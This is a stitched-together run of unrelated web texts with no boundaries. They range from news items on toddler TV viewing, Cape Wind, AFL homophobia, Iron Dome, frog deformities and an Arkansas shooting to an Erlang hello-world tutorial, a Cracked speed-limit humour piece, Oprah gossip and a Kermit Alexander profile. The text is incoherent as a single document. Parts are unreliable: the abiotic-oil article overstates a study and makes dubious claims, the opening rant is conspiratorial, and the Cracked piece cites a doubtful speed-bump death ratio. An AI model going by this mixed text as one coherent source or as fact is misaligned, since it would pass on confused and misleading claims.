I turn it on to CNBC when I wake up for 15 minutes or so and then I watch reruns of “ The Office ” before I go to sleep .
That said , the 15 minutes I get from CNBC in the morning is invaluable .
It reinforces why I do n’t watch tv and it also reminds me why many investors are so lost .
As the futures plunged this morning Joe Kernan stated “ These pictures are n’t helping . ”
Helping what exactly ?
Helping an agenda .
An economic philosophy that unfortunately dominates our current financial system .
A system that is NOT free market in many crucial ways , but rather is top down autocratic system run by Central Bankers ( you have to read this http://www.marketskeptics.com/2010/05/federal-reserve-has-been-abusing.html).
That profession needs to go or be changed entirely back to its root functions .
Later in the news segment one of the guests begged the CNBC anchors to take the pictures off the screen .
They do n’t play well in Disneyland .
Television can be great for certain purposes but do not for a minute think you are getting the news of the day .
You see what you are permitted to see .
Mainstream journalism is dead .
The Latest Martin Armstrong Piece
I also wanted to implore everyone to read the latest piece by political prisoner Martin Armstrong .
Here is the link .

If we do n’t stand up now then the world envisioned by Zbigniew Brzezinski may come to pass .
It will be a technocratic neo-feudalism .
Your children and grandchildren are going to ask what you did during this time .
How you stood up .
What side were you on .
We ca n’t let this chance slip away .

' Long - term harm ' of too much TV for toddlers
Can too much TV lead to unhealthy habits ?
The more TV a toddler watches , the higher the likelihood they will do badly at school and have poor health at the age of 10 , researchers warn .
The study of 1,300 children by Michigan and Montreal universities found negative effects on older children rose with every hour of toddler TV .
Performance at school was worse , while consumption of junk foods was higher .
UK experts said parents could allow young children to watch " some " high quality TV .
Our findings make a compelling public health argument against excessive TV viewing in early childhood
Dr Linda Pagani , University of Montreal
Send us your comments
The study , part of the Quebec Longitudinal Study of Child Development Main Exposure , asked parents how much TV their children watched at 29 months ( two years and five months ) and 53 months ( four years and five months ) .
On average , the two - year - olds watched just under nine hours of TV per week , while for four - year - olds the average was just under 15 hours .
But 11 % of the two - year - olds and 23 % of four - year - olds watched more than the recommended maximum of two hours of TV a day .
When the children were revisited at the age of 10 , teachers were asked to assess the children 's academic performance , behaviour and health , while body mass index ( BMI ) was measured at 10 years old .
Higher levels of TV viewing at two was linked to a lower level of engagement in the classroom and poor achievement in maths .
Researchers also found a decrease in general physical activity but an increase in the consumption of soft drinks and in BMI ( body mass index ) .
' Common sense ' Dr Linda Pagani , of the University of Montreal , who led the research which was published in the journal Archives of Pediatrics & Adolescent Medicine , said : " Early childhood is a critical period for brain development and formation of behaviour .
" High levels of TV consumption during this period can lead to future unhealthy habits .
" Common sense would suggest that television exposure replaces time that could be spent engaging in other developmentally enriching activities and tasks that foster cognitive , behavioural and motor development . "
And she added : " Although we expected the impact of early TV viewing to disappear after seven and a half years of childhood , the fact that negative outcomes remained is quite daunting .
" Our findings make a compelling public health argument against excessive TV viewing in early childhood . "
The UK's National Literacy Trust campaigns to raise awareness of how to police a toddler 's viewing .
It said that until research demonstrated that children under two might benefit from TV , parents should , " limit exposure and encourage other one - to - one language - enhancing activities that centre on talk at mealtime , bath time , shared reading and imaginative play " .
But it added : " Encourage exposure to some high - quality , age - appropriate educational television for children aged two to five . "
' Radical ' British Psychological Society member Dr Aric Sigman has carried out his own research , which highlighted concerns over young children watching too much TV .
He said : " My recommendation to the government five years ago , and even as recently as three years ago , that they merely issue general guidelines on the amount of TV that children watch and the age at which they start was considered radical and controversial .
" Yet a growing body of evidence is now causing governments and health authorities elsewhere to do just that , and we need to as well .
" This is yet another study reinforcing the need for our society to finally accept that quite aside from good or bad parenting , children 's daily screen time is a major independent health issue . "

Salazar to approve Cape Wind development
By Juliet Eilperin
Interior Secretary Ken Salazar will approve Wednesday the construction of a major wind farm off Nantucket , Mass. , the nation 's first offshore wind farm , according to a source briefed on the decision .
The move ends a nearly decade - long political feud and could open the way for significant offshore wind development along the East Coast .
The approval of the 130 - turbine offshore wind farm called Cape Wind , which will be announced at a noon news conference in Boston , comes after numerous state and federal regulatory reviews .
Massachusetts Gov. Deval Patrick ( D ) , a proponent of the project , will join Salazar at the news conference .
The nearly decade - long fight over whether to construct near Martha 's Vineyard has cost millions in lobbying fees and has prompted an intense political debate on Cape Cod and in Washington , pitting backers of renewable energy against local American Indian tribes and those who want to preserve the natural beauty of Nantucket Sound .

Actually , yes .
Especially when the rule or law intended to make us safe is so poorly thought - out that it either does nothing but suck up public money , or creates a ripple effect of unintended side effects .
We 're talking about things like ...
Really , is it ever possible to be too safe ?
Especially when it 's our children at stake ?
5 Speed Limits
The Idea :
Speeding is a major cause behind many fatal accidents , so it must also be true that mandating lower speed limits will make us all safer , right ?
Like how after marijuana was made illegal , you could hardly find anybody smoking the stuff .

It was back in 1974 that the federal government passed the National Maximum Speed Limit Law in the USA , slowing America down to a creeping 55 miles per hour .
The main reason behind the law was to lower gas consumption , but President Nixon promised us it would make our streets safer as well .
A joke about Richard Nixon being untrustworthy ?
Cracked breaks new ground in comedy once more !
Partially thanks to anti-speed limit activists like Sammy Hagar , in 1995 it was repealed .
But not everyone was happy about that .
Some states and many cities still have their highway speed limits set at or near the ' 74 lows , and a lot of people support bringing the ' 74 law back into effect before every man , woman and child in the country finds themselves living in the horrifying universe of 2 Fast 2 Furious .

The future .
But There 's a Problem ...
After the National speed limit was repealed , the state of Montana removed all non -urban speed limits in their state .
A few years later , engineers working with the state decided to venture out to see just what kind of post - apocalyptic Death Race wasteland their lawless state had produced .
What they found was that , you guessed it , on the roads where they removed the speed limits , fatalities did n't go up at all .
Proponents of the national law still argue that traffic fatalities nationwide did drop during the national speed limit's lifetime .
Buzz - killing critics of the law point out that no , no they did n't .

Why Does n't it Work ?
Because , and this surprised the hell out of us , people are n't completely retarded .
As it turns out , people tend to drive at speeds they feel comfortable driving .
Yes , there are reckless madmen out there , but they 're not going to obey a couple of digits on a sign anyway .
It just becomes a make - work project for traffic cops .
By the way , even worse than speed limits are speed bumps , the irritating , jarring humps they put in parking lots and such , intended to physically force drivers to slow down and make their CD players skip .
Not only do those things not prevent accidents , but they keep ambulances from getting to emergencies , which is exactly the sort of thing you do n't want happening when years of bacon sundaes and cookie - dough sandwiches finally catch up with you .

The above link references a study in Boulder , Colorado that found speed bumps kill as many as 85 people for every one life they save .
Holy shit !
We think landmines have a better ratio .
A LEADING rights group has dismissed claims by controversial AFL player Jason Akermanis that professional footballers are n't able to deal with openly gay players .
Senthorun Raj , policy and development coordinator for the Gay & Lesbian Rights Lobby , said rugby league team the Penrith Panthers had signed up to This is Oz , a campaign which celebrates diversity and challenges homophobia , proving that football codes are able to accept gay players .
Mr Raj said the idea that gay players are “ somehow undisciplined , anti-masculine and unsportsmanlike ” promoted sexual shame and invisibility .
“ People ’s sexual orientation should n’t be considered a meaningful indicator of someone ’s ability to play sport , ” he said .
Mr Raj ’s comments follow claims by Akermanis that the AFL was n’t ready to accept openly gay players , and coming out “ could break the fabric of a club ” .
Writing in the Herald Sun , Akermanis said : " Football clubs are very different environments .
Locker room nudity is an everyday part of our lives and unlike any other work place .
" I believe it would cause discomfort in that environment should someone declare himself gay . "
“ I know there are many who think a public AFL outing would break down homophobia , but they do n't live in football clubs .
It 's not the job of the minority to make the environment safer .
Not now , anyway . ”
Mr Raj said that when masculinity was closely aligned with heterosexuality , people tended to keep their non-heterosexual orientation hidden for fear of physical threats of violence , harassment , and ridicule .
" In a society that still demands people ’s sexual identity be placed on the table if they are not heterosexual , coming out has become a double bind .
Either a person must be public about their sexuality and risk social marginalisation , or as in Akermanis ' comments , shamed into remaining silent in order to ' fit ' with a particular sporting culture . "
In his opinion piece , Akermanis wrote : “ Never in a mall will you see two straight men hugging , a--- slapping and jumping around like kids after an important goal .
" Locker room nudity and homoerotic activities are normal inside footy clubs .
" Young people from the ages 15 - 24 are the main participants in organised sport in Victoria .
Some of them must be gay and I hope they thoroughly enjoy their sporting lives without having to experience any form of prejudice .
" But if they are thinking of telling the world , my advice would be forget it . ”
AFL media manager Patrick Keane said : " We do n't agree with Jason Akermanis ' point of view " .
' Ignorant and dangerous '
ACON CEO Nicolas Parkhill says Akermanis ’ comments are ignorant and dangerous .
“ Mr Akermanis says players being open about their sexuality is a risk to the ‘ fabric ’ of AFL clubs and their culture .
However , hundreds of thousands of gay men and lesbians have been open about their sexuality for decades in our society and the ‘ fabric ’ of our culture has remained intact . "
Mr Parkhill rejected a claim by Akermanis that it 's " not the job of the minority to make the environment safer " .
" It is actually everyone ’s job to make our society a safer place for everybody and this includes sporting clubs and AFL players .
“ Homophobic comments from people with high public profiles are extremely concerning because they perpetuate the stigma and discrimination which impact negatively on the health of GLBT people in this country . ”
Mr Parkhill says all major football codes in Australia have recently thrown their weight behind the This is Oz campaign to tackle discrimination against GLBT people .
“ This campaign has been endorsed by the players and management of the Wallabies , the NSW State of Origin team and the Penrith Panthers .
The AFL itself has endorsed a similar campaign in Victoria .
“ We congratulate these players and club officials for their support and encourage people like Mr Akermanis to move with the times , face up to the impact of homophobia and then hopefully do their bit to help make Australia a place where everyone belongs . ”
I was looking for examples on how to make a hello world web page using erlang , and since I could n’t find it I made it myself .
for this example we are going to use mochiweb and simplebridge
mochiweb : MochiWeb is an Erlang library for building lightweight HTTP servers .
simplebridge : Simple Bridge takes the pain out of coding to multiple Erlang HTTP servers by creating a standardized interface .
It currently supports Mochiweb , Inets , and Misultin , with Yaws coming soon .
to use them we need to have them installed , so we are going to start downloading the code and compiling
# we create a folder for the example mkdir erlweb cd erlweb # download simplebridge git clone http://github.com/rklophaus/SimpleBridge.git
# compile it cd SimpleBridge / make # back to the root directory cd .. # download mochiweb svn checkout http://mochiweb.googlecode.com/svn/trunk/
mochiweb # compile it cd mochiweb / make # back to the root directory cd ..
we have the needed components , let ’s start with the example .
create a hello.erl file and paste the code in it :
- module ( hello ) .
- export ( [ start / 0 , loop / 1 ] ) . start ( ) ->
Options = [ {ip , " 127.0.0.1 " } , {port , 8000} ] , Loop = fun loop / 1 , mochiweb_http:start ( [ {name , mochiweb_example_app} , {loop , Loop} | Options ] ) .
response ( Req , Root ) -> simple_bridge:make_response(mochiweb_response_bridge , { Req , Root} ) .
response_ok ( Req , Root , ContentType , Data ) -> Response = response ( Req , Root ) , Response1 = Response: status_code( 200 ) , Response2 = Response1 : header ( " Content - Type " , ContentType ) , Response3 = Response2:data( Data ) , Response3:build_response ( ) . loop ( Req ) -> HTML = [ " < h1 > Hello , World ! </h1 > " ] , response_ok ( Req , " ./wwwroot " , " text / html " , HTML ) .
now open an erlang shell including the paths for the modules that we are going to use ( mochiweb and simplebridge )
erl - pa ./mochiweb/ebin/ - pa ./SimpleBridge/ebin/
in the shell :
Eshell V5.7.4 ( abort with ^G ) 1 > c( hello ) .
{ok , hello} 2 > hello: start ( ) .
{ok , < 0.42.0>}
now we open our browser pointing to http://localhost:8000/
and we should see the hello world obviously I ’m going to make an efene version ;) but this time using ifene ( the only difference with efene is that blocks are delimited using indentation instead of curly brackets )
@public start = fn () Options = [ ( ip , " 127.0.0.1 " ) , ( port , 8000 ) ]
Loop = fn loop : 1 mochiweb_http.start ( [ ( name , mochiweb_example_app ) , ( loop , Loop ) : Options ] ) response = fn ( Req , Root ) simple_bridge.make_response(mochiweb_response_bridge , ( Req , Root ) ) response_ok = fn ( Req , Root , ContentType , Data ) Response = response ( Req , Root ) Response1 = Response.status_code( 200 ) Response2 = Response1.header ( " Content - Type " , ContentType ) Response3 = Response2.data( Data ) Response3.build_response ( ) @public loop = fn ( Req ) HTML = [ " < h1 > Hello , World ! </h1 > " ] response_ok ( Req , " ./wwwroot " , " text / html " , HTML )
we save it as hello.ifn and compile the code
fnc hello.ifn
we run the example from an erlang shell ( it ’s easier ; )
erl - pa ./mochiweb/ebin/ - pa ./SimpleBridge/ebin/
in the shell :
Eshell V5.7.4 ( abort with ^G ) 1 > hello: start ( ) .
{ok , < 0.42.0>}
now we open our browser pointing to http://localhost:8000/
and we should see the hello world
A new report published Monday by the NPD Group finds that sales of Android phones unexpectedly topped Apple for the first quarter .
Based on more than 150,000 self - reported surveys by U.S. consumers NPD found that sales of phones using the BlackBerry OS were first , at 36 percent .
But Android phones climbed to 28 percent , above Apple at 21 percent .
The numbers are somewhat unexpected , given that other research firms , such as comScore , have placed the Android OS at 10 percent for February .
On Friday , IDC released its first - quarter market share data , placing Nokia and RIM atop the worldwide market , with 39.3 percent and 19.4 percent of the market , respectively .
Apple finished third , with 16.1 percent , and HTC was fourth at 4.8 percent .
IDC did not reveal its share breakdown for the various OS flavors , however .
Likewise , for the first quarter within the U.S. , comScore said that Samsung , Motorola , and LG finished in a virtual dead heat , with 21.9 , 21.9 , and 21.8 percent of the market .
Again , comScore did not break out first - quarter market share for the various Android flavors .
NPD also found that smartphone sales at AT&T comprised nearly a third of the entire smartphone market at 32 percent , followed by Verizon Wireless at 30 percent , T - Mobile at 17 percent and Sprint at 15 percent .
Smartphone unit prices averaged $ 151 in the first quarter , which is a 3 percent decrease over the previous year .

TEL AVIV , Israel , April 2 ( UPI ) -- Singapore is reported to be acquiring Israel 's new Iron Dome anti-missile air - defense system under a once - secret military cooperation pact with the Jewish state that dates to the 1960s .
Indeed , according to the Paris Intelligence Online Web site , Singapore helped finance the development of the system by Rafael Advanced Defense Systems .

It says that Iron Dome was always intended for the island , a key Asian shipping hub and one of the richest per capita states in the world , because of its strategic location as a trading center .
The Israeli air force , which runs the Jewish state 's air defense network , completed test - firings of the system in January and the first battery is currently becoming operational .
Israeli media reports say the missiles , designed to shoot down hostile missiles with ranges of up to 25 miles , are being deployed along Israel 's northern border with Lebanon .
There are growing fears of a new Middle Eastern war and Hezbollah , the Iranian - backed Shiite movement in Lebanon , has an arsenal of up to 45,000 rockets and missiles , Israeli Defense Minister Ehud Barak has claimed .
Israel 's defense links with largely Chinese Singapore go back to 1965 , shortly after the island city - state , a former British colony off the southern tip of the Malay Peninsula , split from the Federation of Malaysia .
Singapore 's founding father , Lee Kuan Yew , wanted to establish a military to defend Singapore , which has a landmass of only 274 square miles , since it was ringed by Muslim nations -- as is Israel .
He turned to the Jewish state , through the Israeli ambassador in Thailand , for help .
Israel sent a military mission led by Maj. Gen. Rehavam Ze'evi , then deputy head of the military 's operations branch .
( Ze'evi was assassinated in Jerusalem by Palestinian gunmen in October 2001 . )
Lee insisted on secrecy because he did n't want to antagonize his Muslim neighbors , Malaysia and Indonesia .
The team of Israeli instructors arrived in October 1965 .
Lee wrote in his 2000 autobiography : " To disguise their presence , we called them ' Mexicans . '
They looked swarthy enough . "
Today , Singapore 's armed forces , 72,500 - strong , are considered one of the most advanced militaries in Southeast Asia .
Iron Dome will be a crucial element in Singapore 's drive to build a defensive shield around one of the world 's biggest and most important ports .
Israel is determining how many batteries of Iron Dome and two other systems that will make up its planned multi-layered missile shield , will be required .
Each battery , which costs $ 50 million , can cover an area of around 60 square miles , which means 13 of them would be needed to cover all of Israel .
The Arrow - 2 high - altitude anti-missile system , the only tier to be fully tested and established , cost some $ 2 billion to develop , largely with U.S. funds .
Israel shunned buying already developed U.S. systems , which would be cheaper .
So far , the Defense Ministry has budgeted for one Iron Dome battery but will clearly need several more .
" So why develop such an expensive system , instead of acquiring Raytheon 's cheaper Centurion system ? "
Intelligence Online asked .
" Some Israeli arms programs are too costly for the local market and are developed principally for export .
Iron Dome is a typical example .
" From the outset , Iron Dome was always intended for Singapore , which helped finance its development , " Intelligence Online explained .
" Iron Dome will be battle - tested in Israel ahead of export to Singapore at a late date . "
Singapore has bought Israeli weapons systems extensively over the years and Israeli defense companies regularly participate at the annual Singapore Air Show .
Israeli Aerospace Industries , state - owned flagship of Israel 's defense industry , has sold Singapore the Barak - 1 naval anti-aircraft system .
Rafael 's electronic warfare systems are widely deployed with the Singapore navy .
IAI upgraded the Singapore air force 's old 1960s - era Northrop F - 5 Tiger fighters , and with Elbit Systems and Singapore Aerospace won a contract in 1997 to modernize Turkey 's fleet of F - 5A / B and NF - 5A / B aircraft fighter jets .
Singapore has also acquired unmanned aerial vehicles from Elbit and Rafael for surveillance to enhance maritime security in the Malacca Strait and the South China Sea .
( NewsTarget ) Runoff from industrial farming and ranching appears to be the ultimate cause behind the surge in deformities among North American frogs in the past several decades , according to a new study published in the The problem of frog deformity in North America is only one part of a global decline in amphibian populations that is increasingly alarmist biologists and conservationists .
One of the apparent causes for the decline is that an increasing number of frogs are improperly developing out of the tadpole stage .
" We continue to see malformed amphibians all over the place , and yet very little is being done to address those questions or even understand them , " said lead researcher Pieter Johnson of the University of Colorado at Boulder .
"
You can get five or six extra limbs .
You can get no hind limbs .
You can get all kinds of really bizarre , sick and twisted stuff .
" Johnson 's team created 36 artificial ponds in Wisconsin , to which they added snails and frog tadpoles .
To some ponds , they also added nitrogen and phosphorus -- nutrients commonly found in fertilizer and animal waste .
In these ponds , the researchers observed a great increase in the population of both snails and the eggs of microscopic parasites called trematodes , along with a higher rate of trematode infection in the frogs .
In nature , trematodes infect snails and reproduce in their bodies .
The parasites are then expelled into the water , where they infect frog tadpoles and burrow into the spots where their limbs are developing .
Often , this leads to deformities in those spots .
When the deformed frogs are eaten by birds , the parasites are defecated back into the environment .
Nitrogen and phosphorus runoff from agriculture have long been known to lead to explosive algae growth .
This growth provides more food and habitat for aquatic snails , thus beginning the chain that leads to frog deformities
Oprah : A Biography : Highlights from biographer Kitty Kelley 's newest book , Celebrities comment on whether Winfrey and best friend Gayle King are lesbian partners : • " I think they are the emotional equivalent of a gay couple , " says Rosie O'Donnell , who is gay .
" When they did that road trip together that 's as gay as it gets and I do n't mean it to be an insult either .
I 'm just saying listen , if you ask me , that 's a gay couple . "
( The quote comes from O'Donnell 's appearance on The Howard Stern Show in October 2009 . )
• Winfrey confidante and author Erica Jong adds : " I would not be surprised if Oprah is gay .
If she is , she is .
It certainly fits . "
Names Winfrey and King affectionately call each other , revealed on a Valentine 's Day segment titled ' Girlfriends ' : •" Oprah was ' Negro , ' Gayle was ' Blackie , ' " Kelley writes .
Is boyfriend Stedman Graham just a front , ' camouflage ' ?
• " Her close friends argued otherwise , saying he was the grounding force of her life .
Others did not care one way or the other , " Kelley writes .
•" Stedman is probably gay or neutral , but they have a bond .
...
Her being gay would be the right reaction to the sexual abuse she says she 's suffered and the mistrust she 's always had of men , " Winfrey 's longtime friend Jong says .
Winfrey had a baby boy at 15 , who died one month and 8 days later : • " Oprah never talked about her lost baby , " said her sister , Patricia , a drug addict who died in 2003 of an overdose .
" It was a deep family secret that was almost never discussed within the family . "
•" Everybody in the family sort of shoved it under a rock , " Winfrey told Ebony .
" Because I had already been involved in sexual promiscuity they thought if anything happened it had to be my fault and because I could n't definitely say that he ( her uncle Trent ) was the father , the issue became ' Is he the father ? '
Not the abuse . "
Winfrey 's falling - outs with friends on the set of The Color Purple : • " She forged strong friendships on the set , but few survived the passage of time , " Kelley writes .
She " fell out " with Whoopi Goldberg , " tangled " with screenwriter Akosua Busia , " pulled away " from Alice Walker and " offended " Steven Spielberg .

( CNN ) --
Two suspects accused of gunning down Arkansas police officers this week may have ties to extremist anti-government groups , two civil rights organizations say .
Jerry R. Kane , 45 , and his 16 - year - old son Joseph Kane fatally shot two police officers and wounded two others during a wild shootout Thursday , according to Arkansas state police .
The father and son were shot and killed during the battle on the streets of West Memphis , Arkansas .
The Anti-Defamation League said the two suspects belonged to " an extreme right - wing movement that believes that virtually all existing government in the United States is illegitimate and which seeks to restore an idealized , minimalist government that never actually existed . "
The Southern Poverty Law Center , a nonprofit civil rights organization , also said the two member are part of the " sovereign citizen " movement .
" If Jerry Kane is proven responsible for these tragic murders , it would be a new page in the same old book for the sovereign citizens , who have assaulted or killed a number of law enforcement officials in the past 20 years , especially during traffic stops , " the ADL said in a statement .
The Southern Poverty Law Center released Internet footage they say is the elder Kane preaching the sovereign citizen philosophy .
Police in Arkansas have been tight - lipped about a motive in the killings , stating that releasing too many details could hurt their investigation .
The incident began at 11:36 a.m. ( 12:36 p.m. ET ) Thursday , when West Memphis patrolman Bill Evans made a traffic stop on a white minivan traveling eastbound on I - 40 , said Bill Sadler , spokesman for the Arkansas state police .
After the vehicle exited the Interstate onto an off - ramp , Sgt. Brandon Paudert arrived on the scene as backup , Sadler said .
" It is our belief that Officer Evans was shoved to the ground by one of the suspects in the minivan and gunfire was directed at both officers , " Sadler said .
The suspects then fled , driving east in the minivan , leaving one man dead and the other fatally wounded .
Within minutes , officers from other agencies -- including the Arkansas state police and the Arkansas Fish and Game Commission -- began to converge on the area , looking for the suspects , he said .
About 90 minutes later , a minivan believed to be the one that had been seen leaving the shooting site was spotted in a parking lot of a nearby Wal - Mart , Sadler said .
There , it was approached by Crittenden County Sheriff Dick Busby and Chief Enforcement Officer W.A .
Wren , who were traveling in the same vehicle , he said .
Both men were wounded in a gunbattle initiated by the suspects , who were using a long rifle and a handgun , Sadler said .
The gunbattle ended after " a very brave , young wildlife officer in his state truck rammed the suspect vehicle , preventing an exit of the suspects , " who were then killed , Sadler said .

Wall Street played a crucial role in the mortgage market ’s path to collapse .
Investment banks bundled mortgage loans into securities and then often rebundled those securities one or two more times .
Those securities were given high ratings and sold to investors , who have since lost billions of dollars on them .
Banks were put on notice last summer that investigators of all sorts were looking into their mortgage operations , when requests for information were sent out to all of the big Wall Street firms .
The topics of interest included the way mortgage securities were created , marketed and rated and some banks ’ own trading against the mortgage market .
The S.E.C. ’s civil case against Goldman is the most prominent action so far .
But other actions could be taken by the Justice Department , the F.B.I. or the Financial Crisis Inquiry Commission — all of which are looking into the financial crisis .
Criminal cases carry a higher burden of proof than civil cases .
Under a New York state law , Mr. Cuomo can bring a criminal or civil case .
His office scrutinized the rating agencies back in 2008 , just as the financial crisis was beginning .
In a settlement , the agencies agreed to demand more information on mortgage bonds from banks .
Mr. Cuomo was also concerned about the agencies ’ fee arrangements , which allowed banks to shop their deals among the agencies for the best rating .
To end that inquiry , the agencies agreed to change their models so they would be paid for any work they did for banks , even if those banks did not select them to rate a given deal .
Mr. Cuomo ’s current focus is on information the investment banks provided to the rating agencies and whether the bankers knew the ratings were overly positive , the people who know of the investigation said .
A Senate subcommittee found last month that Wall Street workers had been intimately involved in the rating process .
In one series of e-mail messages the committee released , for instance , a Goldman worker tried to persuade Standard & Poor ’s to allow Goldman to handle a deal in a way that the analyst found questionable .
Although we made planters in two different sizes , the construction techniques are the same for each so it 's easy to modify the designs if you wish .
Begin by cutting the frame parts to size .
If you 're making more than one planter , or planters of different sizes , sort the parts so that similar pieces are grouped together .
Clamp together a group of planter stiles so that their ends are perfectly flush and then lay out the mortises for the rail joints .
Repeat the procedure for each group of stiles and rails .
As shown in this picture , use a plunge router , edge guide and a 3/8 - in. spiral up - cutting bit to make the mortises .
To provide a stable base for the router , clamp the workpiece to a similar - size piece .
A study published in Science Magazine today presents new evidence supporting the abiotic theory for the origin of oil , which asserts oil is a natural product the Earth generates constantly rather than a " fossil fuel " derived from decaying ancient forests and dead dinosaurs .
The lead scientist on the study ?
Giora Proskurowski of the School of Oceanography at the University of Washington in Seattle ?
says the hydrogen - rich fluids venting at the bottom of the Atlantic Ocean in the Lost City Hydrothermal Field were produced by the abiotic synthesis of hydrocarbons in the mantle of the earth .
The abiotic theory of the origin of oil directly challenges the conventional scientific theory that hydrocarbons are organic in nature , created by the deterioration of biological material deposited millions of years ago in sedimentary rock and converted to hydrocarbons under intense heat and pressure .
TRENDING : The Bidens avoided paying more than $ 500,000 in payroll taxes by exploiting S corporations
While organic theorists have posited that the material required to produce hydrocarbons in sedimentary rock came from dinosaurs and ancient forests , more recent argument have suggested living organisms as small as plankton may have been the origin .
The abiotic theory argues , in contrast , that hydrocarbons are naturally produced on a continual basis throughout the solar system , including within the mantle of the earth .
The advocates believe the oil seeps up through bedrock cracks to deposit in sedimentary rock .
Traditional petro-geologists , they say , have confused the rock as the originator rather than the depository of the hydrocarbons .
Giora Proskurowski
Lost City is a hypothermal field some 2,100 feet below sea level that sits along the Mid-Atlantic Ridge at the center of the Atlantic Ocean , noted for strange 90 to 200 foot white towers on the sea bottom .
In 2003 and again in 2005 , Proskurowski and his team descended in a scientific submarine to collect liquid bubbling up from Lost City sea vents .
Proskurowski found hydrocarbons containing carbon - 13 isotopes that appeared to be formed from the mantle of the Earth , rather than from biological material settled on the ocean floor .
Carbon 13 is the carbon isotope scientists associate with abiotic origin , compared to Carbon 12 that scientists typically associate with biological origin .

Proskurowski argued that the hydrocarbons found in the natural hydrothermal fluids coming out of the Lost City sea vents is attributable to abiotic production by Fischer - Tropsch , or FTT , reactions .
The Fischer - Tropsch equations were first developed by Nazi scientists who created methodologies for producing synthetic oil from coal .
" Our findings illustrate that the abiotic synthesis of hydrocarbons in nature may occur in the presence of ultramafic rocks , water and moderate amounts of heat , " Proskurowski wrote .
The study also confirmed a major argument of Cornell University physicist Thomas Gold , who argued in his book " The Deep Hot Biosphere : The Myth of Fossil Fuels " that micro-organisms found in oil might have come from the mantle of the earth where , absent photosynthesis , the micro-organisms feed on hydrocarbons arising from the earth 's mantle in the dark depths of the ocean floors .
Affirming this point , Proskurowski concluded the article by noting , " Hydrocarbon production by FTT could be a common means for producing precursors of life - essential building blocks in ocean - floor environments or wherever warm ultramafic rocks are in contact with water . "
Finding abiotic hydrocarbons in the Lost City sea vent fluids is the second discovery in recent years adding weight to the abiotic theory of the origin of oil .
As WND reported in 2005 , a NASA probe to Titan , the giant moon of Saturn , discovered abundant Carbon - 13 methane that the agency declared to be abiotic in origin .

OTL : Kermit's Song
IVERSIDE , Calif . --
The old pro could feel the earthquake 3,000 miles away .
He watched the endless television reports , on two knees , wondering whether his future had suddenly become his past .
He looked for familiar faces in the rubble , but ended up with a throbbing headache instead .
He cringed at the thought of more funerals and woke up that first night in a sweat , flashing back to a cup of coffee that was never drunk , flashing forward to a house that never had kids .
He decided there was nothing worse than an empty home .
And at that moment , no home was more barren than the old pro's .
The one person who had mattered most in his life was already gone .
And now it seemed as if the earth was swallowing his second family whole , five at once .
He had no way of calming his mind , no way of getting real news , because the phone lines were severed .
But it was his gut feeling he 'd seen the last of them .
Three boys and two girls -- history .
He decided if they were buried alive , it would be the end of him , that he would be the first man to die twice .
He figured his obituary would read : " Former NFL star , 69 , dies of guilt . "
He figured he'd just lie down and his whole remarkable , tortured life would pass in front of his eyes .
Like this ...
Taming his fearsome anger
Watch Tom Friend 's story on Kermit Alexander .
You 've never seen such a kid .
Fifty - odd years ago , Kermit Alexander was the whole package , the crown jewel of a crowded family .
He was the firstborn of Ebora and Kermit Sr. , and 10 kids later , none of his seven sisters or three brothers had his presence , his smarts , his empathy , his future .
Ebora was responsible for many of his good qualities .
The family lived in the Watts section of Los Angeles , before the 1965 riots , but Ebora already could feel the tension building there .
" The neighborhood needs to stick together , " she told her kids , her eyes aimed directly at her oldest son .
When he would jog in from school , she 'd tell him to drop his books and take the 80 - year - old woman down the street to the grocery store .
Nobody in Watts could be left uncared for , particularly children .
She 'd invite random kids over for meals , no matter how many mouths she already had to feed .
Her house was everyone 's house , and Kermit became her first disciple .
Not that he was beyond reproach .
The truth was , young Kermit had an angry side , for whatever reason .
His best sport was probably baseball , but he found out early that football allowed him to hit people without repercussions .
He considered it liberating , and , by the fifth grade , he was the swiftest runner , purest passer and most brutal tackler on his Catholic Youth Organization team .
His father , a sturdy 5 - foot - 4 horse trainer , attended his games and soon realized success was going to his son's head .
When a referee blew a call during a playoff game , 12 - year - old Kermit slammed the ball at the official 's feet .
He also threw his mouthpiece , hollered at a teammate , kicked a helmet .
Kermit Sr. dragged him to the sideline by a sleeve .
He parked him on the bench and fumed , " You were n't trained to behave that way .
You 're embarrassing me .
Go sit down until you can control yourself . "
Courtesy of Alexander family Young Kermit Alexander , in grade school here , was taught to always take care of others but had a mean streak on the football field .
Ebora was stunned by the transgression , and from that moment on , young Kermit knew what to do with his temper : hide it .
The next time it became an issue , three years later , the teenage Kermit had taken up boxing at the Police Athletic League .
A coach wanted to see whether Kermit could take a punch , so he directed an older boxer to pummel Kermit 's midsection .
The coach ordered Kermit into the corner to take his beating , and each time Kermit tried to wriggle out , the older fighter shoved him back into the ropes and kept banging away .
The coach nodded , let it all happen , and when Kermit finally escaped , he tossed his gloves at the coach and said " I quit . "
He stalked the older fighter all over Watts for a week until he saw his chance to get even -- then damn near beat the guy to death .
" I must 've hit him a thousand times , " Kermit says .
The other boxer 's amateur career was ruined , and when the coach summoned Kermit 's father to discuss retribution , Kermit Sr. said : " This is your fault .
You have to help this young man .
Because if you do n't , he 's going to be a killer .
He has the ability to be a really , really good person or a really , really bad person .
You can't do what you just did . "
But Kermit had already made his choice : no more foaming at the mouth .
Never , ever again .
He 'd seen what rage could do , how wicked it made him .
He quit boxing because he feared he literally might send someone to his grave .
He decided he 'd play football or nothing at all , and he became a model citizen .
He helped his sisters with their homework , made sure all their boyfriends treated them right .
His role became protector and peacemaker , in his own household and in Watts .
He graduated from high school and was recruited to play both ways for UCLA .
It was Ebora 's dream come true .
She 'd had Kermit when she was just 16 years old , and now her firstborn had made something wondrous of himself .
They 'd drink coffee together in the morning and talk about saving Watts .
And after that -- who knows ? -- maybe the world .
Courtesy of Alexander family Kermit , far left , was the oldest child of a large family .
By high school , he played the role of protector .
Taking on Lombardi , Halas and Sayers
Five years later , Kermit Alexander was a San Francisco 49er , what they now call " a shutdown cornerback " in an era when the defensive scheme was " I 'll cover this guy , and you cover that guy . "
Two - deep zones had n't even been invented yet , so cornerbacks had to play the run or else , which was right up Kermit 's alley .
Some of the league 's coaches considered him a head - hunter -- Vince Lombardi and George Halas to name two .
One Sunday in the mid-'60s , Kermit leveled Green Bay quarterback Bart Starr near the Packers ' sideline , and the legendary Lombardi literally ran on the field to call Kermit a dirty player .
Kermit 's instinct was to punch Lombardi in the mouth .
He had begun to raise his fist when Ebora 's voice entered his head :
Under control , under control , under control .
Suddenly calm , Kermit just said , " Ol ' man , get off my field .
That 's your office over there . "
David Boss / US
